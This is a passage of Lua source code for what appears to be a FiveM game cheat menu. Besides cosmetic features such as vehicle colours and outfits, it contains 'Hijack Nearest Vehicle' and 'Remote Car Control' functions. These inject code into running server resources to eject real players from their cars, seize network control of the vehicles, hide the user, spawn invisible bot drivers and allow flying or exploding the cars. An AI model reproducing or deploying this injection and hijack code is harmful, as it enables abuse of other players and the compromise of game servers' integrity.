        SetVehicleCustomPrimaryColour(vehicle, redValue, greenValue, blueValue)
        SetVehicleCustomSecondaryColour(vehicle, redValue, greenValue, blueValue)
    end
end


-- Red Slider
local RedSlider = MachoMenuSlider(oyer, "Red", 255, 0, 255, "%", 0, function(Value)
    redValue = math.floor(Value)
    applyRGBColor()
end)

-- Green Slider
local GreenSlider = MachoMenuSlider(oyer, "Green", 255, 0, 255, "%", 0, function(Value)
    greenValue = math.floor(Value)
    applyRGBColor()
end)

-- Blue Slider
local BlueSlider = MachoMenuSlider(oyer, "Blue", 255, 0, 255, "%", 0, function(Value)
    blueValue = math.floor(Value)
    applyRGBColor()
end)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(outfitChangeInterval) -- استخدام المدة اللي حددها اللاعب

        if enableRandomOutfit and NetworkIsPlayerActive(PlayerId()) then
            local newPed = PlayerPedId()
            local success, error = pcall(function()
                -- تغيير مكونات الملابس بشكل عشوائي
                SetPedComponentVariation(newPed, 8, math.random(0, 15), 0, 2)   -- القميص
                SetPedComponentVariation(newPed, 11, math.random(0, 120), 0, 2) -- الجاكيت/الطبقة العلوية
                SetPedComponentVariation(newPed, 3, math.random(0, 15), 0, 2)   -- الذراعين
                SetPedComponentVariation(newPed, 4, math.random(0, 50), 0, 2)   -- البنطلون
                SetPedComponentVariation(newPed, 6, math.random(0, 30), 0, 2)   -- الأحذية

                -- تغيير الإكسسوارات
                SetPedPropIndex(newPed, 0, math.random(0, 10), 0, true) -- القبعة
                SetPedPropIndex(newPed, 1, math.random(0, 10), 0, true) -- النظارات
            end)

            if not success then
            end
        end
    end
end)
-- Rainbow Vehicle Color
local RainbowCar = false

-- Rainbow color function
local function getRainbowColor()
    local time = GetGameTimer() / 1000 -- Get time in seconds
    local speed = 2.0 -- Speed of color change
    
    local r = math.floor((math.sin(time * speed) * 127) + 128)
    local g = math.floor((math.sin(time * speed + 2) * 127) + 128)
    local b = math.floor((math.sin(time * speed + 4) * 127) + 128)
    
    return {r = r, g = g, b = b}
end



MachoMenuText(oyer,"Vehicle Control")

local selectedKey = 0

local selectedFlip = "Flip 1" -- تعريف افتراضي

MachoMenuDropDown(oyer, "Select Flip", function(selectedIndex)
    if selectedIndex == 0 then
        selectedFlip = "Flip 1"
    elseif selectedIndex == 1 then
        selectedFlip = "Flip 2"
    end
end, "Flip 1", "Flip 2")

MachoMenuButton(oyer, "Flip", function()
    local playerPed = PlayerPedId()
    if not DoesEntityExist(playerPed) then return end

    if IsPedSittingInAnyVehicle(playerPed) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        if DoesEntityExist(vehicle) then
            if selectedFlip == "Flip 1" then
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                MachoMenuNotification("Success", "Flip 1 applied!")
            elseif selectedFlip == "Flip 2" then
                ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 0.0, 270.0, 0.0, 0, 0, 1, 1, 0, 1)
                MachoMenuNotification("Success", "Flip 2 applied!")
            end
        else
            MachoMenuNotification("Error", "Vehicle not found!")
        end
    else
        MachoMenuNotification("Error", "You must be inside a vehicle!")
    end
end)

-- دالة للحصول على أقرب سيارة فيها شخص حقيقي
local function GetNearestVehicleWithPlayer()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local nearestVehicle = nil
    local nearestDistance = math.huge
    
    -- البحث عن جميع السيارات القريبة
    for vehicle in EnumerateVehicles() do
        local vehicleCoords = GetEntityCoords(vehicle)
        local distance = #(playerCoords - vehicleCoords)
        
        -- التحقق من وجود سائق في السيارة
        local driverPed = GetPedInVehicleSeat(vehicle, -1)
        if driverPed and driverPed ~= 0 and driverPed ~= playerPed then
            -- التحقق من أن السائق لاعب حقيقي وليس NPC
            if IsPedAPlayer(driverPed) then
                if distance < nearestDistance then
                    nearestDistance = distance
                    nearestVehicle = vehicle
                end
            end
        end
    end
    
    return nearestVehicle, nearestDistance
end

-- دالة تعداد السيارات
function EnumerateVehicles()
    return coroutine.wrap(function()
        local iter, id = FindFirstVehicle()
        if not id or id == 0 then
            EndFindVehicle(iter)
            return
        end
        
        local enum = {handle = iter, destructor = EndFindVehicle}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = FindNextVehicle(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        EndFindVehicle(iter)
    end)
end

local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
    end
}

-- زر القائمة لسرقة أقرب سيارة
MachoMenuButton(oyer, "Hijack Nearest Vehicle", function()
    local playerPed = PlayerPedId()
    local nearestVehicle, distance = GetNearestVehicleWithPlayer()
    
    if nearestVehicle then
        local driverPed = GetPedInVehicleSeat(nearestVehicle, -1)
        
        ClearPedTasksImmediately(playerPed)
        
        MachoInjectResource("any", [[
            Citizen.CreateThread(function()
                local playerPed = PlayerPedId()
                local targetVehicle = ]] .. nearestVehicle .. [[
                local driverPed = GetPedInVehicleSeat(targetVehicle, -1)
                
                if targetVehicle ~= 0 then
                    SetPedMoveRateOverride(playerPed, 10.0)
                    ClearPedTasks(playerPed)
                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                    SetVehicleDoorsLocked(targetVehicle, 1)
                    SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                    
                    if driverPed then
                        TaskLeaveVehicle(driverPed, targetVehicle, 0)
                    end
                    
                    SetPedMoveRateOverride(playerPed, 3.0)
                    
                    ClearPedTasks(playerPed)
                    SetVehicleForwardSpeed(targetVehicle, 0.0)
                    
                    SetPedIntoVehicle(playerPed, targetVehicle, -1)
                    TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                    
                    SetPedMoveRateOverride(playerPed, 1.0)
                end
            end)
        ]])
        
        MachoMenuNotification("Vehicle", "Hijacking nearest vehicle with player (Distance: " .. math.floor(distance) .. "m)")
    else
        MachoMenuNotification("Error", "No vehicle with player found")
    end
end)

local menuDUI = nil
local menuVisible = false
local HELP_URL = "https://7OO4123.github.io/carauction/"

-- Use MachoMenuCheckbox with two callbacks: one for enabling, one for disabling.
MachoMenuCheckbox(oyer, "Remote Car Control", 
    -- CallbackEnabled: This code runs when the checkbox is selected (enabling remote control)
    function()
        local playerPed = PlayerPedId()
        local targetVehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- Check if the player is in a vehicle
        if targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
            -- Clear the player's tasks immediately
            ClearPedTasksImmediately(playerPed)

            local originalPos = GetEntityCoords(playerPed)
            local originalHeading = GetEntityHeading(playerPed)

            -- Select a random resource to inject the remote control logic
            local targetResource = nil
            local resourcePriority = {"any", "any", "any"}
            local foundResources = {}
            for _, resourceName in ipairs(resourcePriority) do
                if GetResourceState(resourceName) == "started" then
                    table.insert(foundResources, resourceName)
                end
            end
            
            if #foundResources > 0 then
                targetResource = foundResources[math.random(1, #foundResources)]
            else
                local allResources = {}
                for i = 0, GetNumResources() - 1 do
                    local resourceName = GetResourceByFindIndex(i)
                    if resourceName and GetResourceState(resourceName) == "started" then
                        table.insert(allResources, resourceName)
                    end
                end
                if #allResources > 0 then
                    targetResource = allResources[math.random(1, #allResources)]
                end
            end

            if targetResource then
                -- Create the help menu (DUI) on the local player's machine
                if not GetCurrentResourceName then
                    return
                end
                
                menuDUI = MachoCreateDui(HELP_URL)
                if not menuDUI then
                    MachoMenuNotification("Remote Car", "Failed to create help menu.")
                    return
                end
                Citizen.Wait(1000)
                MachoShowDui(menuDUI)
                menuVisible = true
                
                -- Loop to handle showing/hiding the menu
                Citizen.CreateThread(function()
                    while menuDUI do
                        Citizen.Wait(0)
                        if IsControlJustPressed(0, 167) then -- F6 to toggle menu
                            menuVisible = not menuVisible
                            if menuVisible then
                                MachoShowDui(menuDUI)
                            else
                                MachoHideDui(menuDUI)
                            end
                        end
                    end
                end)
                
                -- Inject the remote control logic into the target resource
                MachoInjectResource("any", [[
                    Citizen.CreateThread(function()
                        local playerPed = PlayerPedId()
                        local targetVehicle = ]] .. targetVehicle .. [[
                        local originalPos = vector3(]] .. originalPos.x .. [[, ]] .. originalPos.y .. [[, ]] .. originalPos.z .. [[)
                        local originalHeading = ]] .. originalHeading .. [[

                        if targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                            SetVehicleDoorsLocked(targetVehicle, 1)
                            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

                            SetEntityVisible(playerPed, false, false)

                            TaskLeaveVehicle(playerPed, targetVehicle, 0)
                            SetPedMoveRateOverride(playerPed, 10.0)
                            ClearPedTasks(playerPed)
                            SetVehicleForwardSpeed(targetVehicle, 0.0)

                            TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)

                            -- Wait for control of the vehicle
                            local hasControl = false
                            local timeout = 0
                            while not hasControl and timeout < 200 do
                                Citizen.Wait(10)
                                if NetworkHasControlOfEntity(targetVehicle) then
                                    hasControl = true
                                else
                                    NetworkRequestControlOfEntity(targetVehicle)
                                end
                                timeout = timeout + 1
                            end

                            if not hasControl then
                                MachoMenuNotification("Remote Car", "Failed to get control of the vehicle. Aborting.")
                                SetEntityVisible(playerPed, true, false)
                                return
                            end
                            
                            -- Wait for 0.6 seconds after gaining control
                            Citizen.Wait(600)

                            local keepHidden = true
                            Citizen.CreateThread(function()
                                while keepHidden do
                                    SetEntityVisible(playerPed, false, false)
                                    Citizen.Wait(10)
                                end
                            end)

                            Citizen.Wait(500)
                            keepHidden = false

                            ClearPedTasksImmediately(playerPed)
                            SetEntityAsMissionEntity(playerPed, true, true)
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)

                            for i = 1, 50 do
                                SetEntityVisible(playerPed, false, false)
                                Citizen.Wait(10)
                            end

                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityVelocity(playerPed, 0.1, 0.1, 0.0)
                            TaskWanderStandard(playerPed, 0.0, 0)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetEntityVisible(playerPed, false, false)
                            Citizen.Wait(100)
                            ClearPedTasksImmediately(playerPed)
                            SetPedMoveRateOverride(playerPed, 1.0)
                            SetEntityAsMissionEntity(playerPed, false, false)
                            SetEntityCoordsNoOffset(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false)
                            SetEntityHeading(playerPed, originalHeading)
                            Citizen.Wait(100)
                            TaskGoStraightToCoord(playerPed, originalPos.x + 0.5, originalPos.y + 0.5, originalPos.z, 1.0, 500, originalHeading, 0.1)
                            Citizen.Wait(600)
                            ClearPedTasks(playerPed)

                            -- Start full Remote Car system
                            if DoesEntityExist(targetVehicle) then
                                local RemoteCar = {}
                                local isSpectating = false
                                local originalPlayerPed = nil
                                local audioEnabled = true
                                local originalAudioPos = nil
                                local isFlying = false
                                local flightSpeed = 25.0
                                local flightAcceleration = 0.2
                                local isHonking = false
                                local originalLightState = 0

                                RemoteCar.Start = function()
                                    local selectedVehicle = targetVehicle
                                    if not selectedVehicle or not DoesEntityExist(selectedVehicle) then
                                        return
                                    end
                                    RemoteCar.Entity = selectedVehicle
                                    RemoteCar.OriginalPed = PlayerPedId()
                                    originalAudioPos = GetEntityCoords(RemoteCar.OriginalPed)
                                    originalLightState = GetVehicleLightsState(RemoteCar.Entity) and 2 or 0
                                    local success = pcall(function()
                                        RemoteCar.CreateBotDriver()
                                    end)
                                    if not success then
                                        return
                                    end
                                    RemoteCar.StartSpectate()
                                    RemoteCar.SetupAudioSystem()
                                    Citizen.CreateThread(function()
                                        while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                            Citizen.Wait(0)
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                            if isSpectating then
                                                DisableControlAction(0, 30, true)
                                                DisableControlAction(0, 31, true)
                                                DisableControlAction(0, 21, true)
                                                DisableControlAction(0, 22, true)
                                                DisableControlAction(0, 44, true)
                                                DisableControlAction(0, 55, true)
                                                DisableControlAction(0, 76, true)
                                                DisableControlAction(0, 23, true)
                                                DisableControlAction(0, 75, true)
                                                DisableControlAction(0, 101, true)
                                                DisableControlAction(0, 102, true)
                                                DisableControlAction(0, 0, true)
                                                DisableControlAction(0, 140, true)
                                                DisableControlAction(0, 141, true)
                                                DisableControlAction(0, 142, true)
                                                DisableControlAction(0, 143, true)
                                                DisableControlAction(0, 263, true)
                                                DisableControlAction(0, 264, true)
                                                DisableControlAction(0, 24, true)
                                                DisableControlAction(0, 25, true)
                                                EnableControlAction(0, 172, true)
                                                EnableControlAction(0, 173, true)
                                                EnableControlAction(0, 174, true)
                                                EnableControlAction(0, 175, true)
                                                EnableControlAction(0, 32, true)
                                                EnableControlAction(0, 33, true)
                                                EnableControlAction(0, 34, true)
                                                EnableControlAction(0, 35, true)
                                                EnableControlAction(0, 22, true)
                                                EnableControlAction(0, 21, true)
                                                EnableControlAction(0, 47, true)
                                                EnableControlAction(0, 73, true)
                                                EnableControlAction(0, 246, true)
                                                EnableControlAction(0, 44, true)
                                                EnableControlAction(0, 48, true)
                                                EnableControlAction(0, 108, true)
                                                EnableControlAction(0, 23, true)
                                                EnableControlAction(0, 51, true)
                                            end
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local distance = GetDistanceBetweenCoords(
                                                    GetEntityCoords(RemoteCar.OriginalPed),
                                                    GetEntityCoords(RemoteCar.Entity),
                                                    true
                                                )
                                                pcall(function()
                                                    RemoteCar.HandleKeys(distance)
                                                end)
                                                local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                if vehicleCoords then
                                                    SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                                end
                                                if distance <= 2000.0 then
                                                    if not NetworkHasControlOfEntity(RemoteCar.BotPed) then
                                                        NetworkRequestControlOfEntity(RemoteCar.BotPed)
                                                    end
                                                    if not NetworkHasControlOfEntity(RemoteCar.Entity) then
                                                        NetworkRequestControlOfEntity(RemoteCar.Entity)
                                                    end
                                                else
                                                    pcall(function()
                                                        TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                    end)
                                                end
                                            else
                                                break
                                            end
                                        end
                                        pcall(function()
                                            RemoteCar.Stop()
                                            ClearFocus()
                                        end)
                                    end)
                                end

                                RemoteCar.SetupAudioSystem = function()
                                    audioEnabled = true
                                    Citizen.CreateThread(function()
                                        while RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) do
                                            Citizen.Wait(100)
                                            pcall(function()
                                                RemoteCar.UpdateAudioPosition()
                                            end)
                                        end
                                    end)
                                end

                                RemoteCar.UpdateAudioPosition = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    pcall(function()
                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                        SetAudioListenerPosition(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z)
                                        local velocity = GetEntityVelocity(RemoteCar.Entity)
                                        SetAudioListenerVelocity(velocity.x, velocity.y, velocity.z)
                                        local heading = GetEntityHeading(RemoteCar.Entity)
                                        local radHeading = math.rad(heading)
                                        local forwardX = -math.sin(radHeading)
                                        local forwardY = math.cos(radHeading)
                                        SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                        SetAudioFlag("AudioListenerEnabled", true)
                                        SetAudioFlag("LoadMPData", true)
                                        SetAudioFlag("DisableFlightMusic", true)
                                        SetAudioFlag("PauseBeatRepeats", false)
                                    end)
                                end

                                RemoteCar.ToggleAudio = function()
                                    audioEnabled = not audioEnabled
                                    if audioEnabled then
                                        pcall(function()
                                            RemoteCar.UpdateAudioPosition()
                                        end)
                                        MachoMenuNotification("Remote Car", "Audio enabled - hearing from vehicle position")
                                    else
                                        pcall(function()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                                local playerVelocity = GetEntityVelocity(RemoteCar.OriginalPed)
                                                SetAudioListenerVelocity(playerVelocity.x, playerVelocity.y, playerVelocity.z)
                                                local playerHeading = GetEntityHeading(RemoteCar.OriginalPed)
                                                local radHeading = math.rad(playerHeading)
                                                local forwardX = -math.sin(radHeading)
                                                local forwardY = math.cos(radHeading)
                                                SetAudioListenerOrientation(forwardX, forwardY, 0.0, 0.0, 0.0, 1.0)
                                            end
                                        end)
                                        MachoMenuNotification("Remote Car", "Audio disabled - returned to normal audio")
                                    end
                                end

                                RemoteCar.RestoreOriginalAudio = function()
                                    pcall(function()
                                        SetAudioFlag("AudioListenerEnabled", false)
                                        ClearAudioFlags()
                                        if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                            local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                            SetAudioListenerPosition(playerCoords.x, playerCoords.y, playerCoords.z)
                                            SetAudioListenerVelocity(0.0, 0.0, 0.0)
                                            SetAudioListenerOrientation(0.0, 1.0, 0.0, 0.0, 0.0, 1.0)
                                        end
                                    end)
                                end

                                RemoteCar.CreateBotDriver = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    RemoteCar.OriginalPed = PlayerPedId()

                                    pcall(function()
                                        local existingDriver = GetPedInVehicleSeat(RemoteCar.Entity, -1)
                                        if existingDriver and existingDriver ~= 0 and existingDriver ~= RemoteCar.OriginalPed then
                                            if not IsPedAPlayer(existingDriver) then
                                                SetEntityAsMissionEntity(existingDriver, false, false)
                                                DeleteEntity(existingDriver)
                                            else
                                                TaskLeaveVehicle(existingDriver, RemoteCar.Entity, 0)
                                            end
                                        end
                                        for seat = 0, GetVehicleMaxNumberOfPassengers(RemoteCar.Entity) - 1 do
                                            local passenger = GetPedInVehicleSeat(RemoteCar.Entity, seat)
                                            if passenger and passenger ~= 0 and not IsPedAPlayer(passenger) then
                                                SetEntityAsMissionEntity(passenger, false, false)
                                                DeleteEntity(passenger)
                                            end
                                        end
                                    end)

                                    if not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end

                                    local modelHash = GetHashKey("mp_m_freemode_01")
                                    RequestModel(modelHash)
                                    local timeout = 0
                                    while not HasModelLoaded(modelHash) and timeout < 20 do
                                        Citizen.Wait(10)
                                        timeout = timeout + 1
                                    end

                                    if not HasModelLoaded(modelHash) or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end

                                    local coords = GetEntityCoords(RemoteCar.Entity)
                                    local heading = GetEntityHeading(RemoteCar.Entity)

                                    local success, botPed = pcall(function()
                                        return CreatePed(5, modelHash, coords.x, coords.y, coords.z, heading, false, false)
                                    end)

                                    if not success or not botPed or botPed == 0 then
                                        return
                                    end

                                    RemoteCar.BotPed = botPed

                                    pcall(function()
                                        SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                        SetEntityInvincible(RemoteCar.BotPed, true)
                                        SetEntityVisible(RemoteCar.BotPed, true)
                                        SetPedAlertness(RemoteCar.BotPed, 0)
                                        SetPedCanRagdoll(RemoteCar.BotPed, false)
                                        SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                        SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                        SetEntityVisible(RemoteCar.BotPed, false, false)

                                        Citizen.CreateThread(function()
                                            while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                Citizen.Wait(100)
                                                SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                SetEntityVisible(RemoteCar.BotPed, true, false)
                                                for i = 0, 255 do
                                                    if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                        SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                    end
                                                end
                                            end
                                        end)
                                    end)

                                    local enterTimeout = 0
                                    while not IsPedInVehicle(RemoteCar.BotPed, RemoteCar.Entity) and enterTimeout < 5 and DoesEntityExist(RemoteCar.Entity) do
                                        Citizen.Wait(20)
                                        enterTimeout = enterTimeout + 1
                                        TaskWarpPedIntoVehicle(RemoteCar.BotPed, RemoteCar.Entity, -1)
                                    end
                                end

                                RemoteCar.StartSpectate = function()
                                    if not RemoteCar.BotPed or not DoesEntityExist(RemoteCar.BotPed) then
                                        return
                                    end
                                    if DoesCamExist(RemoteCar.SpectateCamera) then
                                        DestroyCam(RemoteCar.SpectateCamera)
                                    end
                                    local success, camera = pcall(function()
                                        return CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                    end)
                                    if not success or not camera then
                                        return
                                    end
                                    RemoteCar.SpectateCamera = camera
                                    SetCamFov(RemoteCar.SpectateCamera, 75.0)
                                    RemoteCar.CameraDistance = 8.0
                                    RemoteCar.CameraHeight = 3.0
                                    RemoteCar.CameraAngleHorizontal = 0.0
                                    RemoteCar.CameraAngleVertical = -10.0
                                    isSpectating = true
                                    RenderScriptCams(1, 0, 0, 1, 1)
                                    Citizen.CreateThread(function()
                                        while isSpectating and RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                            Citizen.Wait(0)
                                            pcall(function()
                                                if IsPedInAnyVehicle(RemoteCar.BotPed, false) then
                                                    local vehicle = GetVehiclePedIsIn(RemoteCar.BotPed, false)
                                                    if vehicle and DoesEntityExist(vehicle) then
                                                        local vehicleCoords = GetEntityCoords(vehicle)
                                                        local mouseX = GetDisabledControlNormal(0, 1) * 15.0
                                                        local mouseY = GetDisabledControlNormal(0, 2) * 8.0
                                                        RemoteCar.CameraAngleHorizontal = RemoteCar.CameraAngleHorizontal + mouseX
                                                        RemoteCar.CameraAngleVertical = math.max(-45.0, math.min(45.0, RemoteCar.CameraAngleVertical + mouseY))
                                                        if IsControlPressed(0, 15) then
                                                            RemoteCar.CameraDistance = math.max(3.0, RemoteCar.CameraDistance - 0.5)
                                                        elseif IsControlPressed(0, 16) then
                                                            RemoteCar.CameraDistance = math.min(15.0, RemoteCar.CameraDistance + 0.5)
                                                        end
                                                        local radianHorizontal = math.rad(RemoteCar.CameraAngleHorizontal)
                                                        local radianVertical = math.rad(RemoteCar.CameraAngleVertical)
                                                        local offsetX = math.sin(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                        local offsetY = math.cos(radianHorizontal) * RemoteCar.CameraDistance * math.cos(radianVertical)
                                                        local offsetZ = math.sin(radianVertical) * RemoteCar.CameraDistance
                                                        local cameraPos = vector3(
                                                            vehicleCoords.x + offsetX,
                                                            vehicleCoords.y + offsetY,
                                                            vehicleCoords.z + RemoteCar.CameraHeight + offsetZ
                                                        )
                                                        SetFocusPosAndVel(cameraPos.x, cameraPos.y, cameraPos.z, 0.0, 0.0, 0.0)
                                                        SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                        PointCamAtEntity(RemoteCar.SpectateCamera, vehicle, 0.0, 0.0, 0.0, true)
                                                        DisableControlAction(0, 1, true)
                                                        DisableControlAction(0, 2, true)
                                                        DisableControlAction(0, 15, true)
                                                        DisableControlAction(0, 16, true)
                                                        if IsControlJustPressed(0, 45) then
                                                            RemoteCar.CameraDistance = 8.0
                                                            RemoteCar.CameraHeight = 3.0
                                                            RemoteCar.CameraAngleHorizontal = 0.0
                                                            RemoteCar.CameraAngleVertical = -10.0
                                                        end
                                                        SetTextFont(4)
                                                        SetTextProportional(1)
                                                        SetTextScale(0.0, 0.4)
                                                        SetTextColour(255, 255, 255, 255)
                                                        SetTextEntry("STRING")
                                                        local speed = GetEntitySpeed(vehicle) * 3.6
                                                        local audioStatus = audioEnabled and "ON" or "OFF"
                                                        DrawText(0.02, 0.02)
                                                    end
                                                end
                                            end)
                                        end
                                    end)
                                end

                                RemoteCar.StopSpectate = function()
                                    if isSpectating then
                                        isSpectating = false
                                        pcall(function()
                                            ClearFocus()
                                            if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                                local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                                SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                                ClearFocus()
                                            else
                                                ClearFocus()
                                            end
                                            RenderScriptCams(0, 0, 0, 1, 0)
                                            if DoesCamExist(RemoteCar.SpectateCamera) then
                                                DestroyCam(RemoteCar.SpectateCamera)
                                                RemoteCar.SpectateCamera = nil
                                            end
                                            SetPlayerControl(PlayerId(), true, 0)
                                        end)
                                    end
                                end

                                RemoteCar.MakeVehicleExplode = function()
                                    if not RemoteCar.Entity or not DoesEntityExist(RemoteCar.Entity) then
                                        return
                                    end
                                    pcall(function()
                                        ExplodeVehicleInCutscene(RemoteCar.Entity, true)
                                    end)
                                end

                                RemoteCar.HandleHonking = function()
                                    if IsControlPressed(0, 51) then
                                        if not isHonking then
                                            isHonking = true
                                            pcall(function()
                                                SetVehicleDoorOpen(RemoteCar.Entity, 0, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 1, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 2, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 3, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 4, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 5, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 6, false, false)
                                                SetVehicleDoorOpen(RemoteCar.Entity, 7, false, false)
                                            end)
                                        end
                                    else
                                        if isHonking then
                                            isHonking = false
                                            pcall(function()
                                                if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    for i = 0, 7 do
                                                        SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                    end
                                                end
                                            end)
                                        end
                                    end
                                end

                                RemoteCar.HandleKeys = function(distance)
                                    if IsControlJustReleased(0, 23) then
                                        isFlying = not isFlying
                                        pcall(function()
                                            if isFlying then
                                                SetVehicleGravity(RemoteCar.Entity, false)
                                                SetEntityCollision(RemoteCar.Entity, false, false)
                                                SetEntityCollision(RemoteCar.BotPed, false, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, GetEntityHeading(RemoteCar.Entity), 2, true)
                                                SetEntityDynamic(RemoteCar.Entity, false)
                                                SetEntityDynamic(RemoteCar.BotPed, false)
                                            else
                                                SetVehicleGravity(RemoteCar.Entity, true)
                                                SetEntityCollision(RemoteCar.Entity, true, true)
                                                SetEntityCollision(RemoteCar.BotPed, true, true)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                                PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                SetEntityDynamic(RemoteCar.Entity, true)
                                                SetEntityDynamic(RemoteCar.BotPed, true)
                                            end
                                        end)
                                    end
                                    if IsControlJustReleased(0, 47) then
                                        if isSpectating then
                                            RemoteCar.StopSpectate()
                                        else
                                            RemoteCar.StartSpectate()
                                        end
                                    end
                                    if IsControlJustPressed(0, 45) then
                                        pcall(function()
                                            if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                SetVehicleFixed(RemoteCar.Entity)
                                                SetVehicleDeformationFixed(RemoteCar.Entity)
                                                SetVehicleUndriveable(RemoteCar.Entity, false)
                                                SetVehicleEngineOn(RemoteCar.Entity, true, true, false)
                                                StopEntityFire(RemoteCar.Entity)
                                                local coords = GetEntityCoords(RemoteCar.Entity)
                                                local heading = GetEntityHeading(RemoteCar.Entity)
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z + 1.0, false, false, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                if not isFlying then
                                                    PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                                end

                                                if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                                    DeleteEntity(RemoteCar.BotPed)
                                                end

                                                local modelHash = GetHashKey("mp_m_freemode_01")
                                                if not HasModelLoaded(modelHash) then
                                                    RequestModel(modelHash)
                                                    while not HasModelLoaded(modelHash) do
                                                        Citizen.Wait(10)
                                                    end
                                                end

                                                RemoteCar.BotPed = CreatePedInsideVehicle(RemoteCar.Entity, 5, modelHash, -1, false, false)
                                                SetEntityAsMissionEntity(RemoteCar.BotPed, true, true)
                                                SetEntityInvincible(RemoteCar.BotPed, true)
                                                SetPedAlertness(RemoteCar.BotPed, 0)
                                                SetPedCanRagdoll(RemoteCar.BotPed, false)
                                                SetPedCanBeTargetted(RemoteCar.BotPed, false)
                                                SetPedCanBeDraggedOut(RemoteCar.BotPed, false)
                                                SetEntityVisible(RemoteCar.BotPed, false, false)

                                                Citizen.CreateThread(function()
                                                    while RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) do
                                                        Citizen.Wait(100)
                                                        SetEntityAlpha(RemoteCar.BotPed, 255, false)
                                                        SetEntityVisible(RemoteCar.BotPed, true, false)
                                                        for i = 0, 255 do
                                                            if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                                                SetEntityVisibleToPlayer(i, RemoteCar.BotPed, false)
                                                            end
                                                        end
                                                    end
                                                end)

                                                if isSpectating and RemoteCar.SpectateCamera and DoesCamExist(RemoteCar.SpectateCamera) then
                                                    RemoteCar.CameraDistance = 8.0
                                                    RemoteCar.CameraHeight = 3.0
